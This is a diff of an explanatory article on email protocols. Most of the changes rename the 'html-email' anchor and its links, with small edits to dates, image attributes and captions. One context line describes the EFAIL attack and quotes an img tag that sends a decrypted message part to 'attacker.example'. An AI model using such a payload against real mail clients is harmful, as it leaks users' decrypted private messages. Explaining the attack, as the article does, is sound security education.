@@ -3,7 +3,7 @@ title: Email
 icon: envelope
 category: Technologies
 author: Kaspar Etter
-published: 2021-04-26
+published: 2021-05-01
 teaser: Modern email is a patchwork of protocols and extensions. Here is one article to understand them all.
 math: false
 ---
@@ -624,7 +624,7 @@ Last but not least, an email has a [body](https://tools.ietf.org/html/rfc5322#se
 The body contains the actual content of a message.
 It can be formatted in different ways and can consist of [different parts](#multipart-messages).
 Splitting the body into several parts is useful,
-for example, to send a plaintext version alongside an [HTML-encoded](#html-email) message
+for example, to send a plaintext version alongside an [HTML-encoded](#html-emails) message
 or to [attach files](https://en.wikipedia.org/wiki/Email_attachment) to an email.
 We'll discuss [later](#content-encoding) how all of this works.
 
@@ -935,7 +935,7 @@ in which case the domains of the two servers are likely
 completely different from the organization's domain.
 This is the case for my email configuration:
 
-{% include image.md source="email-settings-automatic.png" caption="The simplified email architecture corresponds to what mail clients like Apple Mail display to you.<br>The domain of the address (`ef1p.com`) is different from the domain of the servers (`mail.gandi.net`).<br>The host names of the incoming mail server and the outgoing mail server are usually not the same." scaled="true" themed="true" %}
+{% include image.md source="email-settings-automatic.png" caption="The simplified email architecture corresponds to what mail clients like Apple Mail display to you.<br>The domain of the address (`ef1p.com`) is different from the domain of the servers (`mail.gandi.net`).<br>The host names of the incoming mail server and the outgoing mail server are usually not the same." themed="true" %}
 
 One more thing that users need to be informed about is whether to use the full email address
 or only the local part before the @ symbol (or even something completely different) as the user name.
@@ -1811,7 +1811,7 @@ Are they talking about [CRAM (challenge-response authentication mechanism)](#cha
 which uses a hash function and not encryption,
 or does this option make TLS [opportunistic](#implicit-tls-versus-explicit-tls)? 🤷‍♂️
 
-{% include image.md source="email-settings-manual.png" caption="The server settings in Apple Mail when \"Automatically manage connection settings\" is disabled. Also somewhat disappointingly, Apple Mail uses Explicit TLS rather than Implicit TLS by default." scaled="true" themed="true" image-max-width="560" caption-max-width="610" %}
+{% include image.md source="email-settings-manual.png" caption="The server settings in Apple Mail when \"Automatically manage connection settings\" is disabled. Also somewhat disappointingly, Apple Mail uses Explicit TLS rather than Implicit TLS by default." themed="true" image-max-width="560" caption-max-width="610" %}
 
 </details>
 
@@ -3789,7 +3789,7 @@ but they cannot be related to one another (in red).
   If the hash function is secure, neither of them can skew the result in their favor.
 
 <figure markdown="block">
-{% include_relative generated/applications-commitment-schemes.embedded.svg %}
+{% include_relative generated/applications-commitment-scheme.embedded.svg %}
 <figcaption markdown="span">
 If `CoinFlipAlice = CoinFlipBob`, Alice wins.
 If `CoinFlipAlice ≠ CoinFlipBob`, Bob wins.
@@ -6053,7 +6053,7 @@ but this is completely optional and the format for doing so isn't standardized.
 Most mail clients [prefix quoted lines](https://en.wikipedia.org/wiki/Posting_style#Quoted_line_prefix)
 with the greater-than sign in a text-based response and wrap the quoted text in a
 [`blockquote` element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blockquote)
-[when using HTML](#html-email).
+[when using HTML](#html-emails).
 Modern clients typically display quoted text with a vertical bar.
 
 <figure markdown="block">
@@ -6440,7 +6440,7 @@ Additionally, [whitespace](https://en.wikipedia.org/wiki/Whitespace_character)
 including newlines need to be encoded and Percent encoding is usually used on UTF-8 strings.
 I've included this box and the following tool mostly for the sake of completeness.
 The only place where you might find Percent-encoded strings in emails
-is in [links](https://en.wikipedia.org/wiki/Hyperlink) of [HTML messages](#html-email).
+is in [links](https://en.wikipedia.org/wiki/Hyperlink) of [HTML messages](#html-emails).
 
 <div id="tool-encoding-percent"></div>
 
@@ -7458,7 +7458,7 @@ to use this example in the [ESMTP tool](#esmtp-tool) above.
 </figcaption>
 </figure>
 
-This data format has mostly been superseded by [HTML](#html-email) and is not widely supported.
+This data format has mostly been superseded by [HTML](#html-emails) and is not widely supported.
 Apple Mail strips all the tags and displays the text without formatting.
 Gmail doesn't recognize the format and offers just a download option.
 Only Thunderbird displays the text with formatting but doesn't support the `<color>` tag.
@@ -7466,8 +7466,8 @@ Only Thunderbird displays the text with formatting but doesn't support the `<col
 </details>
 
 <details markdown="block">
-<summary markdown="span" id="html-email">
-HTML email
+<summary markdown="span" id="html-emails">
+HTML emails
 </summary>
 
 Nowadays, most messages are formatted with the [Hypertext Markup Language (HTML)](https://en.wikipedia.org/wiki/HTML).
@@ -7694,7 +7694,7 @@ the [child selector](https://www.campaignmonitor.com/css/selectors/child/) is no
 </figure>
 
 Since [inline styles are more specific](https://specifishity.com/),
-the example from the [previous box](#html-email) didn't have this problem.
+the example from the [previous box](#html-emails) didn't have this problem.
 Yahoo.com and Outlook.com do a better job than Gmail.
 Yahoo rewrites the custom style to `#yiv4554178645 a`,
 which overrides the default `.msg-body a`.
@@ -8124,7 +8124,7 @@ and leave the rest for the boxes below.
   which don't support multipart messages see the simplest version of the message first.
   Mail clients usually display the last part which has a content type that they support
   unless the user configured a different preference.
-  `multipart/alternative` is most commonly used to provide a plaintext version of [HTML messages](#html-email)
+  `multipart/alternative` is most commonly used to provide a plaintext version of [HTML messages](#html-emails)
   for users of [text-based](https://en.wikipedia.org/wiki/Text-based_user_interface) mail clients,
   such as [Elm](https://en.wikipedia.org/wiki/Elm_(email_client)),
   [Pine](https://en.wikipedia.org/wiki/Pine_(email_client)),
@@ -8333,7 +8333,7 @@ where the size is provided in bytes and the dates are formatted according to
 Aggregate documents
 </summary>
 
-Certain content types, such as [HTML](#html-email),
+Certain content types, such as [HTML](#html-emails),
 can reference external resources, such as styles and images.
 If the external resources are not attached to the message,
 your mail client has to fetch them over the Internet
@@ -9008,7 +9008,7 @@ The recipient of a message learns the following things about the sender (listed 
   I reported [this privacy bug](https://bugzilla.mozilla.org/show_bug.cgi?id=1680197)
   to the Thunderbird team on 2 December 2020.
   Until a fix is available, you can set the `mail.smtpserver.default.hello_argument` option in the
-  [Config Editor](https://support.mozilla.org/en-US/kb/config-editor) to something like `[192.168.1.1]`.
+  [config editor](https://support.mozilla.org/en-US/kb/config-editor) to something like `[192.168.1.1]`.
   Such a value is typical for those who use [network address translation (NAT)](/internet/#network-address-translation).
 - **Attachments**: The [content disposition](#content-disposition) of attachments can include information
   such as when the file was created and when it was last modified.
@@ -9042,7 +9042,7 @@ then all the [above privacy issues](#sender-towards-recipients) also apply, of c
 
 ##### Remote content
 
-[HTML emails](#html-email) can include remote content,
+[HTML emails](#html-emails) can include remote content,
 which is then fetched by the mail client when reading the message.
 Images are by far the most common type of remote content.
 They are usually included with the [`<img>` element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Img)
@@ -9500,7 +9500,7 @@ Casualties are to be expected in such a setup.
 
 #### Quoting HTML messages
 
-[HTML emails](#html-email) can be [styled](#email-styling).
+[HTML emails](#html-emails) can be [styled](#email-styling).
 When you reply to or forward such an email, your mail client has to make sure
 that the quoted message cannot change the appearance of your own message.
 If your mail client fails to do so, someone can put words into your mouth:
@@ -10098,7 +10098,7 @@ So here comes the list of things which should never have been approved or implem
 - [**MIME version**](#content-encoding):
   The `MIME-Version: 1.0` header is pointless, which is also acknowledged by
   [the author himself](https://www.networkworld.com/article/2199390/the-mime-guys--how-two-internet-gurus-changed-e-mail-forever.html).
-- [**HTML emails**](#html-email):
+- [**HTML emails**](#html-emails):
   In my opinion, HTML emails were introduced prematurely
   without thinking through the [implications](#different-appearances) first.
   At the very least, a subset of HTML and CSS should have been standardized,
@@ -11149,7 +11149,7 @@ Unfortunately, there are three problems with this idea:
   For example, if the [`Content-Type` header field](#content-type) is not included in the `h` tag,
   an attacker can move the original message into the preamble
   by changing the [boundary delimiter](#boundary-delimiter).
-  If the content is a simple [HTML message](#html-email),
+  If the content is a simple [HTML message](#html-emails),
   mail clients have to be strict in how they parse the message
   to prevent [content overlays](#quoting-html-messages).
 
@@ -13736,7 +13736,7 @@ and complexity is detrimental to security,
 which is not ideal for end-to-end security.
 Security researchers [published several attacks on S/MIME and PGP](https://efail.de/) in 2018.
 Among other things, they showed that several mail clients, including Apple Mail and Thunderbird,
-allowed [HTML content](#html-email) to span several MIME parts.
+allowed [HTML content](#html-emails) to span several MIME parts.
 An attacker could simply wrap an encrypted part with `<img src="https://attacker.example/{EncryptedPart}">`
 in order to trick mail clients into sending the decryption to them.
 A vulnerability like this is yet another reason to disable [remote content](#remote-content) in your mail client.
@@ -13957,7 +13957,7 @@ Content-Type: application/pgp-signature
 
 **PGP signature** with protected headers.
 [↗](https://tools.ietf.org/id/draft-autocrypt-lamps-protected-headers-02.html#section-9.1)
-The original subject is replaced only when the message is encrypted.
+The original subject is replaced with three dots only when the message is encrypted.
 
 </figcaption>
 </figure>
